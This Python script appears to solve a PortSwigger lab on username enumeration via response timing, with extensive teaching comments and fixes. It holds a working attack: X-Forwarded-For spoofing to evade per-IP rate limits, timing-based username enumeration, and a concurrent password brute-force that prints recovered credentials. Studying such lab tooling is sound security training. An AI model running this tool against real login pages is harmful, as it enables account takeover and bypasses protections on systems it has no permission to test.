#!/usr/bin/env python3
# Copyright (c) 2026 cyberprophetTV. Licensed under the MIT License (see LICENSE).
#
# FOR EDUCATIONAL USE ONLY.
# Intended for solving PortSwigger Web Security Academy labs and for
# use against systems you OWN or have EXPLICIT WRITTEN PERMISSION to
# test. Running this against unauthorized systems is illegal in most
# jurisdictions (CFAA in the US, Computer Misuse Act in the UK, etc).
# You are responsible for ensuring your use is lawful. See README.
"""
=====================================================================
Solver for PortSwigger lab:
  "Username enumeration via response timing"
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
=====================================================================

THE VULNERABILITY: TIMING ORACLES
---------------------------------
A "timing oracle" is when a server unintentionally reveals secret
information through HOW LONG it takes to respond - even when the
response BODY is identical for both cases.

Login forms are a classic source of timing oracles. Consider the
typical login code path:

    user = db.find_user(submitted_username)
    if user is None:
        return "Invalid credentials"          # FAST: ~1 ms
    if not bcrypt.verify(submitted_password, user.hashed_password):
        return "Invalid credentials"          # SLOW: bcrypt takes ~100 ms
    # ... successful login

Both error responses look identical from the outside ("Invalid
credentials"), but they take very different amounts of time to
generate. The invalid-username path returns IMMEDIATELY. The
valid-username-but-wrong-password path runs bcrypt against the stored
hash, which is intentionally slow (~100 ms per attempt, by design,
to slow down offline brute-force).

That ~100 ms delta is the timing oracle. Even though the body
doesn't leak username validity, the elapsed time does.

WHY BCRYPT IS SLOW
------------------
Password-hashing functions like bcrypt, argon2, scrypt, and PBKDF2
are DELIBERATELY slow. Their work factor (e.g. bcrypt cost=12) is
tuned to take ~100 ms on modern hardware - making each guess
expensive for an offline attacker who's brute-forcing a leaked
database.

Mitigating timing oracles requires the application to take EQUAL
time for valid and invalid usernames. The standard fix:
    user = db.find_user(submitted_username)
    if user is None:
        # Compute a dummy bcrypt against a dummy hash so the time
        # taken matches the "valid user" path.
        bcrypt.verify(submitted_password, DUMMY_HASH)
        return "Invalid credentials"

Apps that DON'T do this leak username validity through timing,
which is what this lab demonstrates.

THE LONG-PASSWORD AMPLIFIER (kind of)
-------------------------------------
In some implementations, the time delta is larger when the
submitted password is LONGER. This isn't universally true (bcrypt's
runtime is fixed by the cost factor, not input length), but in
practice many apps do extra work that scales with input - for
example, pre-hashing the input with SHA-512 before bcrypt to handle
the 72-byte bcrypt input limit, or running input through Unicode
normalization. Sending a long junk password (~1000 chars) tends to
exaggerate any per-byte processing and makes the timing oracle
easier to spot above noise.

IP-BASED RATE LIMITING + X-FORWARDED-FOR
----------------------------------------
This particular lab also enforces a per-IP rate limit on /login:
fail too often from the same IP and you get blocked. That would
shut us down after ~20 probes.

The lab is configured to trust the X-Forwarded-For header for its
source-IP determination (this is a common - and broken - pattern in
real apps that sit behind a load balancer). By sending a DIFFERENT
X-Forwarded-For on every request, we make the lab think each probe
comes from a different upstream IP. The rate limiter then counts
each IP independently and never trips.

In the real world this is a VERY common bypass:
  - Apps behind a CDN or reverse proxy often trust X-Forwarded-For
    blindly for "the client's real IP"
  - Attacker spoofs the header
  - Per-IP rate limiting / IP blocklists are completely defeated

The fix: only trust X-Forwarded-For from your own upstream proxies
(allowlist), strip it from external client requests.

STATISTICAL APPROACH
--------------------
Network jitter (and request-handling jitter on the server) means
any single response time is noisy. To reduce noise we send N samples
per username (default 3), take the MEAN of the response times, and
rank candidates by that mean.

  - Most candidates: mean ~50-100 ms (fast invalid-user path)
  - Valid candidate: mean ~200+ ms (slow bcrypt path)

We then report the top few candidates sorted by mean response time.
The clear outlier at the top is the valid username.

A more robust approach uses MEDIAN instead of mean (resistant to a
single outlier sample) and reports standard deviation alongside the
mean so you can eyeball the confidence. This script reports both.
"""

# ---------------------------------------------------------------------
# IMPORTS
# ---------------------------------------------------------------------
import argparse
import json
import random
import re
import statistics                                 # mean / median / stdev
import sys
import time
import uuid
from concurrent.futures import (
    ThreadPoolExecutor,
    as_completed,
)
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from _common import (
    tag_info, tag_ok, tag_warn, tag_err,
    progress, bold, dim,
)


# ---------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------
def random_ip() -> str:
    """
    Generate a random IPv4 address for the X-Forwarded-For header.

    We avoid the reserved ranges to look more like a real client:
      - 0.x.x.x      "this network" (RFC 1122)
      - 127.x.x.x    loopback
      - 10/8, 172.16/12, 192.168/16 private (RFC 1918)
      - 169.254/16   link-local
      - 224/4        multicast
      - 240/4        future use

    A simpler implementation could just emit 1.1.1.1-style randoms;
    in practice the lab doesn't care. We just need each request to
    have a different value so the rate limiter buckets them apart.
    """
    while True:
        # First octet: 1-223, excluding 10/100/127/169/172/192/198/224+
        a = random.randint(1, 223)
        if a in (10, 127, 169, 172, 192, 198):
            continue
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def parse_jitter(s: str) -> tuple[float, float]:
    if "-" in s:
        lo, hi = s.split("-", 1)
        return float(lo), float(hi)
    v = float(s)
    return v, v


def maybe_jitter(jitter: tuple[float, float]) -> None:
    lo, hi = jitter
    if hi > 0:
        time.sleep(random.uniform(lo, hi))


def build_session(workers: int, proxy: str | None = None,
                  insecure: bool = False, retries: int = 2) -> requests.Session:
    s = requests.Session()
    retry = Retry(
        total=retries, backoff_factor=0.5,
        status_forcelist=[502, 503, 504],
        allowed_methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers, max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": "portswigger-lab-solver/1.0"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    if insecure:
        s.verify = False
    return s


def read_wordlist(path: Path) -> list[str]:
    return [w for w in (line.strip() for line in path.read_text().splitlines()) if w]


# ---------------------------------------------------------------------
# CONFIG
# ---------------------------------------------------------------------
@dataclass
class AttackConfig:
    base_url: str
    workers: int
    jitter: tuple[float, float]
    long_password: str         # the long junk password to amplify the timing oracle
    samples: int               # how many times to probe each candidate (averaging)
    proxy: str | None
    insecure: bool
    retries: int
    verbose: bool
    output: Path | None
    use_xff: bool              # whether to rotate X-Forwarded-For per request


# ---------------------------------------------------------------------
# PROBE
# ---------------------------------------------------------------------
def post_login(session: requests.Session, base_url: str,
               username: str, password: str, use_xff: bool) -> tuple[float, int]:
    """
    Send one login attempt. Return (elapsed_seconds, status_code).

    We measure elapsed time with time.monotonic() - it's the right
    clock for elapsed-duration measurements because (unlike time.time)
    it never goes backwards and isn't affected by NTP adjustments.

    If use_xff is True, we set a fresh random X-Forwarded-For header
    so the lab's per-IP rate limiter treats this as a brand new client.
    """
    headers = {}
    if use_xff:
        headers["X-Forwarded-For"] = random_ip()

    start = time.monotonic()
    r = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        headers=headers,
        allow_redirects=False,
        timeout=30,
    )
    elapsed = time.monotonic() - start
    return elapsed, r.status_code


# ---------------------------------------------------------------------
# MAIN ATTACK
# ---------------------------------------------------------------------
def find_username_by_timing(cfg: AttackConfig, usernames: list[str]) -> str | None:
    """
    For each candidate, send cfg.samples probes with cfg.long_password
    and record response times. Compute mean + median per candidate.
    The valid username has a noticeably higher mean.
    """
    session = build_session(cfg.workers, cfg.proxy, cfg.insecure, cfg.retries)

    print(f"{tag_info()} probing {len(usernames)} usernames "
          f"x {cfg.samples} samples = {len(usernames) * cfg.samples} requests")
    print(f"{tag_info()} password length: {len(cfg.long_password)} chars "
          f"(long passwords amplify the bcrypt time delta)")
    print(f"{tag_info()} X-Forwarded-For rotation: {'on' if cfg.use_xff else 'off'}")

    # Per-username list of measured response times in seconds.
    samples: dict[str, list[float]] = {u: [] for u in usernames}

    def probe(u: str, _sample_index: int):
        """Single probe. Returns (username, elapsed)."""
        maybe_jitter(cfg.jitter)
        elapsed, _status = post_login(session, cfg.base_url, u, cfg.long_password, cfg.use_xff)
        return u, elapsed

    # Build the full work list: (username, sample_index) pairs.
    # We INTERLEAVE the samples across usernames (probe u1 sample 0,
    # u2 sample 0, ..., u1 sample 1, u2 sample 1, ...) rather than
    # batching all samples for one user. This spreads out network
    # conditions over the run so transient slow periods don't bias
    # any one user.
    work = [(u, i) for i in range(cfg.samples) for u in usernames]

    with ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        futures = [ex.submit(probe, u, i) for u, i in work]
        for fut in progress(as_completed(futures), total=len(futures), desc="timing"):
            u, elapsed = fut.result()
            samples[u].append(elapsed)
            if cfg.verbose:
                print(f"    {u!r}: sample {len(samples[u])}/{cfg.samples} = {elapsed*1000:.1f} ms")

    # ---- Aggregate ----
    # For each user, compute mean and median. We rank by MEAN (most
    # sensitive to the timing signal) but report median too (more
    # robust against single-sample outliers).
    stats = {}
    for u in usernames:
        ts = samples[u]
        if len(ts) >= 2:
            stats[u] = {
                "mean": statistics.mean(ts),
                "median": statistics.median(ts),
                "stdev": statistics.stdev(ts),
                "n": len(ts),
            }
        else:
            stats[u] = {"mean": ts[0] if ts else 0.0,
                        "median": ts[0] if ts else 0.0,
                        "stdev": 0.0, "n": len(ts)}

    # Sort users descending by mean - slowest user first.
    ranked = sorted(stats.items(), key=lambda kv: kv[1]["mean"], reverse=True)

    # ---- Outlier detection ----
    # The valid user's mean response time should sit significantly
    # above the rest. A simple test: how many standard deviations
    # is the top mean above the median of all means?
    all_means = [s["mean"] for s in stats.values()]
    overall_median = statistics.median(all_means)
    overall_stdev = statistics.stdev(all_means) if len(all_means) >= 2 else 0.0
    top_user, top_stats = ranked[0]
    z_score = ((top_stats["mean"] - overall_median) / overall_stdev) if overall_stdev > 0 else 0.0

    print(f"{tag_info()} top 5 candidates by mean response time:")
    for u, s in ranked[:5]:
        print(f"    {u!r:30s}  mean={s['mean']*1000:.1f} ms  "
              f"median={s['median']*1000:.1f} ms  stdev={s['stdev']*1000:.1f} ms  n={s['n']}")
    print(f"{tag_info()} top candidate's z-score vs all candidates' medians: "
          f"{z_score:.2f}")

    # A z-score above ~3 is a strong signal of an outlier. Below ~1.5
    # means the candidate isn't clearly distinguishable from the
    # baseline noise - probably need more samples or longer password.
    if z_score < 1.5:
        print(f"{tag_warn()} z-score too low to be confident. Try --samples 5+ "
              f"or a longer --long-password.")
        return None

    print(f"{tag_ok()} valid username: {bold(top_user)}  "
          f"(mean {top_stats['mean']*1000:.1f} ms, z={z_score:.2f})")
    return top_user


# ---------------------------------------------------------------------
# Phase 2: brute-force the password (need IP rotation here too - we'd
# trip the per-IP lockout on this lab without it)
# ---------------------------------------------------------------------
def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> str | None:
    print(f"{tag_info()} phase 2: trying {len(passwords)} passwords against {username!r}")
    session = build_session(cfg.workers, cfg.proxy, cfg.insecure, cfg.retries)
    found: str | None = None

    def probe(p: str):
        maybe_jitter(cfg.jitter)
        # Per-IP rate limit applies here too, so keep rotating XFF.
        _elapsed, status = post_login(session, cfg.base_url, username, p, cfg.use_xff)
        return p, status

    with ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        futures = {ex.submit(probe, p): p for p in passwords}
        for fut in progress(as_completed(futures), total=len(futures), desc="passwords"):
            p, status = fut.result()
            if status == 302:
                found = p
                print(f"{tag_ok()} password found: {p!r}")
                for f in futures:
                    f.cancel()
                break
    return found


# ---------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("base_url", help="Lab URL")
    ap.add_argument("usernames", type=Path, help="Username wordlist")
    ap.add_argument("passwords", type=Path, help="Password wordlist")
    ap.add_argument("--workers", type=int, default=5,
                    help="Concurrent requests (default 5 - keep low so timing "
                         "measurements aren't muddied by overlapping requests)")
    ap.add_argument("--samples", type=int, default=3,
                    help="How many times to probe each username (default 3). "
                         "Higher = more reliable, slower.")
    ap.add_argument("--long-password",
                    default="a" * 1000,
                    help="Long junk password used in Phase 1 to amplify the "
                         "bcrypt time delta. Default: 'a' * 1000.")
    ap.add_argument("--no-xff", action="store_true",
                    help="Disable X-Forwarded-For rotation. Without this you "
                         "WILL trip the lab's per-IP rate limiter and probably "
                         "get blocked partway through.")
    ap.add_argument("--jitter", type=parse_jitter, default=(0.0, 0.0),
                    metavar="MIN-MAX",
                    help="Random delay before each request")
    ap.add_argument("--proxy", metavar="URL",
                    help="HTTP proxy. 'burp' = http://127.0.0.1:8080.")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--verbose", action="store_true",
                    help="Print every individual sample time as it arrives")
    ap.add_argument("--output", type=Path, metavar="FILE.json",
                    help="Write JSON summary to this file")
    args = ap.parse_args()

    proxy = args.proxy
    insecure = args.insecure
    if proxy:
        if proxy.strip().lower() == "burp":
            proxy = "http://127.0.0.1:8080"
        elif "://" not in proxy:
            proxy = f"http://{proxy}"
        insecure = True
        print(f"{tag_info()} routing through proxy: {proxy}")
    if insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parsed = urlparse(args.base_url)
    if not parsed.scheme or not parsed.netloc:
        sys.exit(f"{tag_err()} base_url must include scheme + host")
    base = f"{parsed.scheme}://{parsed.netloc}"

    cfg = AttackConfig(
        base_url=base, workers=args.workers, jitter=args.jitter,
        long_password=args.long_password, samples=args.samples,
        proxy=proxy, insecure=insecure, retries=args.retries,
        verbose=args.verbose, output=args.output,
        use_xff=not args.no_xff,
    )

    usernames = read_wordlist(args.usernames)
    passwords = read_wordlist(args.passwords)

    user = find_username_by_timing(cfg, usernames)
    if not user:
        sys.exit(1)
    pw = brute_password(cfg, user, passwords)
    if not pw:
        print(f"{tag_err()} no password matched.")
        sys.exit(1)

    print()
    print(f"=== credentials: {bold(user)}:{bold(pw)} ===")

    if cfg.output is not None:
        cfg.output.write_text(json.dumps({
            "lab_url": cfg.base_url,
            "valid_username": user,
            "password": pw,
            "credentials": f"{user}:{pw}",
            "samples_per_user": cfg.samples,
        }, indent=2) + "\n")
        print(f"{tag_info()} wrote summary to {cfg.output}")


if __name__ == "__main__":
    main()
